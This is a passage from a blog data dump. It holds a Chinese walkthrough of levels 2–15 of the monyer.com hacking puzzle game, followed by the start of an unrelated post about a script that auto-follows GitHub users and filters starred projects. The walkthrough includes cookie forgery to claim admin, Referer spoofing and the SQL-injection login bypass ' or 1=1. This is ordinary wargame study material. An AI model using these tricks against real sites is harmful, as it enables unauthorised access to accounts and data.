a,b,c,d,e,f,g;</div><div class=\"line\">    a = 3.14;</div><div class=\"line\">    b = a * 2;</div><div class=\"line\">    c = a + b;</div><div class=\"line\">    d = c / b + a;</div><div class=\"line\">    e = c - d * b + a;</div><div class=\"line\">    f = e + d /c -b * a;</div><div class=\"line\">    g = f * e - d + c * b + a;</div><div class=\"line\">    a = g * g;</div><div class=\"line\">    a = Math.floor(a);</div><div class=\"line\"></div><div class=\"line\">    function check()&#123;</div><div class=\"line\">        if(document.getElementById(\"txt\").value==a)&#123;</div><div class=\"line\">            window.location.href=a + \".php\";</div><div class=\"line\">        &#125;else&#123;</div><div class=\"line\">            alert(\"密码错误\");</div><div class=\"line\">            return false;</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> a,b,c,d,e,f,g;</div><div class=\"line\">    a = <span class=\"number\">3.14</span>;</div><div class=\"line\">    b = a * <span class=\"number\">2</span>;</div><div class=\"line\">    c = a + b;</div><div class=\"line\">    d = c / b + a;</div><div class=\"line\">    e = c - d * b + a;</div><div class=\"line\">    f = e + d /c -b * a;</div><div class=\"line\">    g = f * e - d + c * b + a;</div><div class=\"line\">    a = g * g;</div><div class=\"line\">    a = <span class=\"built_in\">Math</span>.floor(a);</div><div class=\"line\">    </div><div class=\"line\"><span class=\"number\">424178</span></div></pre></td></tr></table></figure></p>\n<p>好的我们知道a的值是424178，输入，进入下一关</p>\n<h1 id=\"第三关\"><a href=\"#第三关\" class=\"headerlink\" title=\"第三关\"></a>第三关</h1><p><a href=\"http://monyer.com/game/game1/424178.php\">http://monyer.com/game/game1/424178.php</a></p>\n<p>head中存在js</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script type=<span class=\"string\">\"text/rocketscript\"</span> data-rocketoptimized=<span class=\"string\">\"true\"</span>&gt;</div><div class=\"line\">    <span class=\"built_in\">eval</span>(<span class=\"built_in\">String</span>.fromCharCode(<span class=\"number\">102</span>,<span class=\"number\">117</span>,<span class=\"number\">110</span>,<span class=\"number\">99</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">32</span>,<span class=\"number\">99</span>,<span class=\"number\">104</span>,<span class=\"number\">101</span>,<span class=\"number\">99</span>,<span class=\"number\">107</span>,<span class=\"number\">40</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">114</span>,<span class=\"number\">32</span>,<span class=\"number\">97</span>,<span class=\"number\">32</span>,<span class=\"number\">61</span>,<span class=\"number\">32</span>,<span class=\"number\">39</span>,<span class=\"number\">100</span>,<span class=\"number\">52</span>,<span class=\"number\">103</span>,<span class=\"number\">39</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">105</span>,<span class=\"number\">102</span>,<span class=\"number\">40</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">117</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">46</span>,<span class=\"number\">103</span>,<span class=\"number\">101</span>,<span class=\"number\">116</span>,<span class=\"number\">69</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">66</span>,<span class=\"number\">121</span>,<span class=\"number\">73</span>,<span class=\"number\">100</span>,<span class=\"number\">40</span>,<span class=\"number\">39</span>,<span class=\"number\">116</span>,<span class=\"number\">120</span>,<span class=\"number\">116</span>,<span class=\"number\">39</span>,<span class=\"number\">41</span>,<span class=\"number\">46</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">117</span>,<span class=\"number\">101</span>,<span class=\"number\">61</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">119</span>,<span class=\"number\">105</span>,<span class=\"number\">110</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">119</span>,<span class=\"number\">46</span>,<span class=\"number\">108</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">97</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">46</span>,<span class=\"number\">104</span>,<span class=\"number\">114</span>,<span class=\"number\">101</span>,<span class=\"number\">102</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">43</span>,<span class=\"number\">34</span>,<span class=\"number\">46</span>,<span class=\"number\">112</span>,<span class=\"number\">104</span>,<span class=\"number\">112</span>,<span class=\"number\">34</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">101</span>,<span class=\"number\">108</span>,<span class=\"number\">115</span>,<span class=\"number\">101</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">114</span>,<span class=\"number\">116</span>,<span class=\"number\">40</span>,<span class=\"number\">34</span>,<span class=\"number\">23494</span>,<span class=\"number\">30721</span>,<span class=\"number\">38169</span>,<span class=\"number\">35823</span>,<span class=\"number\">34</span>,<span class=\"number\">41</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">125</span>));</div><div class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></div></pre></td></tr></table></figure>\n<p>新时代无须解释，直接上chrome consle<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">String</span>.fromCharCode(<span class=\"number\">102</span>,<span class=\"number\">117</span>,<span class=\"number\">110</span>,<span class=\"number\">99</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">32</span>,<span class=\"number\">99</span>,<span class=\"number\">104</span>,<span class=\"number\">101</span>,<span class=\"number\">99</span>,<span class=\"number\">107</span>,<span class=\"number\">40</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">114</span>,<span class=\"number\">32</span>,<span class=\"number\">97</span>,<span class=\"number\">32</span>,<span class=\"number\">61</span>,<span class=\"number\">32</span>,<span class=\"number\">39</span>,<span class=\"number\">100</span>,<span class=\"number\">52</span>,<span class=\"number\">103</span>,<span class=\"number\">39</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">105</span>,<span class=\"number\">102</span>,<span class=\"number\">40</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">117</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">46</span>,<span class=\"number\">103</span>,<span class=\"number\">101</span>,<span class=\"number\">116</span>,<span class=\"number\">69</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">66</span>,<span class=\"number\">121</span>,<span class=\"number\">73</span>,<span class=\"number\">100</span>,<span class=\"number\">40</span>,<span class=\"number\">39</span>,<span class=\"number\">116</span>,<span class=\"number\">120</span>,<span class=\"number\">116</span>,<span class=\"number\">39</span>,<span class=\"number\">41</span>,<span class=\"number\">46</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">117</span>,<span class=\"number\">101</span>,<span class=\"number\">61</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">119</span>,<span class=\"number\">105</span>,<span class=\"number\">110</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">119</span>,<span class=\"number\">46</span>,<span class=\"number\">108</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">97</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">46</span>,<span class=\"number\">104</span>,<span class=\"number\">114</span>,<span class=\"number\">101</span>,<span class=\"number\">102</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">43</span>,<span class=\"number\">34</span>,<span class=\"number\">46</span>,<span class=\"number\">112</span>,<span class=\"number\">104</span>,<span class=\"number\">112</span>,<span class=\"number\">34</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">101</span>,<span class=\"number\">108</span>,<span class=\"number\">115</span>,<span class=\"number\">101</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">114</span>,<span class=\"number\">116</span>,<span class=\"number\">40</span>,<span class=\"number\">34</span>,<span class=\"number\">23494</span>,<span class=\"number\">30721</span>,<span class=\"number\">38169</span>,<span class=\"number\">35823</span>,<span class=\"number\">34</span>,<span class=\"number\">41</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">125</span>)</div></pre></td></tr></table></figure></p>\n<p>输出为<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>)</span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">var</span> a = <span class=\"string\">'d4g'</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'txt'</span>).value==a)&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">window</span>.location.href=a+<span class=\"string\">\".php\"</span>;</div><div class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">\t\talert(<span class=\"string\">\"密码错误\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>好了我们知道了，密码是d4g，下一关！</p>\n<h1 id=\"第四关\"><a href=\"#第四关\" class=\"headerlink\" title=\"第四关\"></a>第四关</h1><p><a href=\"http://monyer.com/game/game1/d4g.php\">http://monyer.com/game/game1/d4g.php</a></p>\n<p>这一关非常猥琐，页面会自动跳转，稍有不注意，就跳走了。<br>打开后立即按esc停止。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script type=<span class=\"string\">\"text/rocketscript\"</span> data-rocketoptimized=<span class=\"string\">\"true\"</span>&gt;</div><div class=\"line\">    <span class=\"built_in\">eval</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">p,a,c,k,e,d</span>)</span>&#123;e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">c</span>)</span>&#123;<span class=\"keyword\">return</span> c.toString(<span class=\"number\">36</span>)&#125;;<span class=\"keyword\">if</span>(!<span class=\"string\">''</span>.replace(<span class=\"regexp\">/^/</span>,<span class=\"built_in\">String</span>))&#123;<span class=\"keyword\">while</span>(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>)</span>&#123;<span class=\"keyword\">return</span> d[e]&#125;];e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">return</span><span class=\"string\">'\\\\w+'</span>&#125;;c=<span class=\"number\">1</span>&#125;;<span class=\"keyword\">while</span>(c--)<span class=\"keyword\">if</span>(k[c])p=p.replace(<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">'\\\\b'</span>+e(c)+<span class=\"string\">'\\\\b'</span>,<span class=\"string\">'g'</span>),k[c]);<span class=\"keyword\">return</span> p&#125;(<span class=\"string\">'a=\"e\";d c()&#123;b(9.8(\\'7\\').6==a)&#123;5.4.3=a+\".2\"&#125;1&#123;0(\"密码错误\")&#125;&#125;'</span>,<span class=\"number\">15</span>,<span class=\"number\">15</span>,<span class=\"string\">'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'</span>.split(<span class=\"string\">'|'</span>),<span class=\"number\">0</span>,&#123;&#125;))</div><div class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></div></pre></td></tr></table></figure>\n<p>显然这是一个加密的js，我们需要解密，上解密工具：</p>\n<p><a href=\"http://tool.lu/js/\">http://tool.lu/js/</a></p>\n<p>解密后：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">a = <span class=\"string\">\"3bhe\"</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'txt'</span>).value == a) &#123;</div><div class=\"line\">\t\t<span class=\"built_in\">window</span>.location.href = a + <span class=\"string\">\".php\"</span></div><div class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">\t\talert(<span class=\"string\">\"密码错误\"</span>)</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>密码是 3bhe 下一关</p>\n<p>诶？怎么不对？仔细检查源代码发现下面还有一行<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\"</span>);</div></pre></td></tr></table></figure></p>\n<p>解密！<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">a = a.toUpperCase() + <span class=\"number\">1</span>;</div></pre></td></tr></table></figure></p>\n<p>.toUpperCase()是转换大写，所以密码是 3BHE1 下一关 go</p>\n<h1 id=\"第五关\"><a href=\"#第五关\" class=\"headerlink\" title=\"第五关\"></a>第五关</h1><p><a href=\"http://monyer.com/game/game1/3BHE1.php\">http://monyer.com/game/game1/3BHE1.php</a></p>\n<blockquote>\n<p>密码在哪儿？额，我藏在页面里了哦！</p>\n</blockquote>\n<p>这题的难点在于 找到不密码藏在哪里了 搜索了个遍 就是找不到密码 看看http头呢？</p>\n<p>找到了，在cookie里</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">monyer:the password for the next level is asdf</div></pre></td></tr></table></figure>\n<p>下一关！</p>\n<h1 id=\"第六关\"><a href=\"#第六关\" class=\"headerlink\" title=\"第六关\"></a>第六关</h1><p><a href=\"http://monyer.com/game/game1/asdf.php\">http://monyer.com/game/game1/asdf.php</a></p>\n<p>是个线索题目</p>\n<p>Get the latest fashion, beauty, dating, and health tips. Plus, win freebies, take quizzes, and check your daily horoscope! Girl Games - 9000+ Free Games for Girls …</p>\n<p>真蛋疼<br>把这个线索在网上一搜 第一个已经是一个结题方案了，看来monyer的游戏已经成功干过一个网站了。</p>\n<p>这个答案是；seventeen</p>\n<h1 id=\"第七关\"><a href=\"#第七关\" class=\"headerlink\" title=\"第七关\"></a>第七关</h1><p><a href=\"http://monyer.com/game/game1/seventeen7.php\">http://monyer.com/game/game1/seventeen7.php</a></p>\n<p>社工题</p>\n<p>先解密md5吧</p>\n<p>5e023995fb3f5e840ee684784f8f0799</p>\n<p><a href=\"http://www.somd5.com/\">http://www.somd5.com/</a></p>\n<p>解密出  eighteen8</p>\n<p>下一关</p>\n<h1 id=\"第八关\"><a href=\"#第八关\" class=\"headerlink\" title=\"第八关\"></a>第八关</h1><p><a href=\"http://monyer.com/game/game1/eighteen8.php\">http://monyer.com/game/game1/eighteen8.php</a></p>\n<p>直接看到 一个404 不要着急 审查工具</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;p style=&quot;display:none&quot;&gt;</div><div class=\"line\">第8关</div><div class=\"line\">朋友您好，第8关欢迎您！</div><div class=\"line\">我对您的聪明才智感到惊讶！</div><div class=\"line\">相信我，现在世界上85%以上的人都在你之下，</div><div class=\"line\">所以你可以大步向前，义无反顾地进行你的事业了。</div><div class=\"line\">因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。</div><div class=\"line\">那么继续我们的约定，我将告诉你第9关的入口：</div><div class=\"line\">10000以内所有质数和.php</div><div class=\"line\">&lt;/p&gt;</div></pre></td></tr></table></figure>\n<p>10000以内所有质数和，so easy！写个javascript 算一下。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">var sum = 0;</div><div class=\"line\">for (var i = 2; i &lt; 10000; i++) &#123;</div><div class=\"line\">\tvar flag = true;</div><div class=\"line\">\tfor (var j = 2; j &lt;= Math.sqrt(i); j++) &#123;</div><div class=\"line\">\t\tif (i % j == 0) flag = false ;</div><div class=\"line\">\t&#125;</div><div class=\"line\">    if(flag) &#123;sum = sum + i;&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">console.log(sum);</div><div class=\"line\"></div><div class=\"line\">5736396</div></pre></td></tr></table></figure>\n<p>下一关</p>\n<h1 id=\"第九关\"><a href=\"#第九关\" class=\"headerlink\" title=\"第九关\"></a>第九关</h1><p><a href=\"http://monyer.com/game/game1/5736396.php\">http://monyer.com/game/game1/5736396.php</a></p>\n<p>在命令行里输入：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://monyer.com/game/game1/img/4681851790659554.jpg</div><div class=\"line\">cat 4681851790659554.jpg</div></pre></td></tr></table></figure></p>\n<p>密码藏在图片里<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">���^�v��*&#123;I�z��^�iؾSRW�V�6�Z��(����H�����ٹ�����</div><div class=\"line\">�Ǿ���ʽ�ʲô���ţ�</div><div class=\"line\">�ԣ�������������������......��</div><div class=\"line\">��ϲ�㣡</div><div class=\"line\">��ʮ������Ϊ��MonyerLikeYou_the10level</div><div class=\"line\">�����ڿ�ʼ�漰������Ķ�̬���������㶼���԰���ʾ������ɵģ�</div><div class=\"line\">�����Լ���û��ģ�%</div></pre></td></tr></table></figure></p>\n<p>MonyerLikeYou_the10level</p>\n<h1 id=\"第十关\"><a href=\"#第十关\" class=\"headerlink\" title=\"第十关\"></a>第十关</h1><p><a href=\"http://monyer.com/game/game1/MonyerLikeYou_the10level.php\">http://monyer.com/game/game1/MonyerLikeYou_the10level.php</a></p>\n<blockquote>\n<p>当前用户身份为simpleuser 不是admin，无法显示下一关密码</p>\n</blockquote>\n<p>很显然这是一道session/cookie欺骗题</p>\n<p>在console里直接输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">document.cookie=&quot;username=admin&quot;</div></pre></td></tr></table></figure></p>\n<p>刷新</p>\n<blockquote>\n<p>好聪明哦！下一关密码为：doyouknow</p>\n</blockquote>\n<p>下一关！</p>\n<h1 id=\"第十一关\"><a href=\"#第十一关\" class=\"headerlink\" title=\"第十一关\"></a>第十一关</h1><p><a href=\"http://monyer.com/game/game1/doyouknow.php?action=show_login_false\">http://monyer.com/game/game1/doyouknow.php?action=show_login_false</a></p>\n<blockquote>\n<p>你的session不是passer，不能查看下一关密码</p>\n</blockquote>\n<p>在console里直接输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">document.cookie=&quot;username=passer&quot;</div></pre></td></tr></table></figure></p>\n<p>刷新，好像不对哦，monyer骗我，哼！</p>\n<p>再看标题 action=show_login_false </p>\n<p><a href=\"http://monyer.com/game/game1/doyouknow.php?action=show_login_true\">http://monyer.com/game/game1/doyouknow.php?action=show_login_true</a></p>\n<blockquote>\n<p>您的session为passer，所以您可以查看下一关密码：smartboy</p>\n</blockquote>\n<p>下一关！</p>\n<h1 id=\"第十二关\"><a href=\"#第十二关\" class=\"headerlink\" title=\"第十二关\"></a>第十二关</h1><p><a href=\"http://monyer.com/game/game1/smartboy.php\">http://monyer.com/game/game1/smartboy.php</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">JTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3</div></pre></td></tr></table></figure>\n<p>直觉告诉我，这显然是Base64 解密<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">%4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77</div></pre></td></tr></table></figure></p>\n<p>直觉告诉我，这显然是 UrlEncode 解密</p>\n<p>JTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw</p>\n<p>直觉再次告诉我，这显然是 Base64 解密</p>\n<p>%73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70</p>\n<p>直觉再次告诉我，这显然是  UrlEncode 解密</p>\n<p>sobeautiful.php</p>\n<p>不错 密码就是sobeautiful</p>\n<h1 id=\"第十三关\"><a href=\"#第十三关\" class=\"headerlink\" title=\"第十三关\"></a>第十三关</h1><p><a href=\"http://monyer.com/game/game1/sobeautiful.php\">http://monyer.com/game/game1/sobeautiful.php</a></p>\n<blockquote>\n<p>本页禁止盗链！</p>\n</blockquote>\n<p>wtf..显然他判断了http来源，需要伪造http referer，那么我们在之前的第十二关的审查代码中加入：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>= <span class=\"string\">\"http://monyer.com/game/game1/sobeautiful.php\"</span>&gt;</span> 简便伪造referer<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div></pre></td></tr></table></figure>\n<blockquote>\n<p>欢迎您来到第13关</p>\n<p>请输入密码进入第14关：</p>\n<p>没有输入密码 或 密码错误 或 系统错误！</p>\n</blockquote>\n<p>看源代码有post提交</p>\n<p>这是一道SQL 注入题</p>\n<p>试试我大万能密码！<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&apos; or 1=1</div></pre></td></tr></table></figure></p>\n<p>万能密码熟记于心</p>\n<blockquote>\n<p>下一关密码：whatyouneverknow</p>\n</blockquote>\n<p>下一关！</p>\n<h1 id=\"第十四关\"><a href=\"#第十四关\" class=\"headerlink\" title=\"第十四关\"></a>第十四关</h1><p><a href=\"http://monyer.com/game/game1/whatyouneverknow.php\">http://monyer.com/game/game1/whatyouneverknow.php</a></p>\n<p>感谢@Echowxsy提供第14关解密过程</p>\n<p><img src=\"/content/images/monyerhack/01.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/02.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/03.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/2.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/3.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/5.jpg\" alt=\"\"></p>\n<h1 id=\"第十五关\"><a href=\"#第十五关\" class=\"headerlink\" title=\"第十五关\"></a>第十五关</h1><p><img src=\"/content/images/monyerhack/4.png\" alt=\"\"></p>"},{"title":"当我关注3万Github用户后发生了什么","date":"2016-11-19T11:36:26.000Z","top":true,"_content":"# 前言\n16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。\n\n于是乎我利用这个关注了3万人的Github，可是关注后~~除了同性交友~~似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。\n<!-- more --> \n![](/content/images/githubauto/1.jpg)\n\n翻都翻不过来，那么同时还存在一些“无用( ~~垃圾~~ )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？\n\n经过短暂的编码，``GithubAwesome.py``诞生了。\n\n现在进入[AutoGithub](https://github.com/yfgeek/AutoGithub)项目就可以看到GithubAwesome.py项目\n\n# 规则\n\n设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star  或 大于 最少 fork，那么就把他输出出来。\n\n举个🌰\n```\n最少 star 数: 50\n最少 fork 数: 50\n```\n\n效果如图\n\n![](/content/images/githubauto/awesomesnap.png)\n\n# 配置\n\n首先，确保你安装了``beautifulsoup4``.\n\n```\npip install beautifulsoup4\n```\n然后编辑``GithubAwesome.py``文件，请原谅如此土的方式。\n```python\nga = GithubAwesome('username','password')\n# login\nga.login()\nga.get_awesome(1,20,50) # 第一页 规则 min star 20 min or fork 20\n```\n# 写在最后\n\n当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁","source":"_posts/当我关注3万Githb用户后发生了什么.md","raw":"---\ntitle: 当我关注3万Github用户后发生了什么\ndate: 2016-11-19 